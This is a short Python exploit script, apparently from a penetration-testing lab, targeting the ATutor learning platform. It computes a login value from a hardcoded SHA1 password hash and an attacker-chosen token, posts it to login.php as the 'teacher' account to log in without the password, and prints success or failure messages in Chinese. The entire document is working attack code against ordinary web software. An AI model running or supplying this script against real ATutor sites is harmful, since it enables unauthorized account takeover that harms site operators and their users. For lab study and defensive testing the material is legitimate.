import sys, hashlib, requests
def gen_hash(passwd, token):
	# COMPLETE THIS FUNCTION
	passwd = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
	#sha1(sha1(password) + token)
	#string = string.encode('utf-8')
	hashed = hashlib.sha1((passwd+token).encode('utf-8')).hexdigest()
	return hashed
def we_can_login_with_a_hash(target):
	target = "http://{0}/ATutor/login.php".format(target)
	token = "hax"
	hashed = gen_hash(hash, token)
	d = {
	"form1_password_hidden" : hashed,
	"form1_login": "teacher",
	"submit1": "Login",
	"token" : token
	}
	print(d)
	s = requests.Session()
	r = s.post(target, data=d)
	res = r.text
	#print(res)
	if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
		print("登入成功")
	else:
		print("登入失敗")
if __name__ == "__main__":
	target = "atutor"
	we_can_login_with_a_hash(target)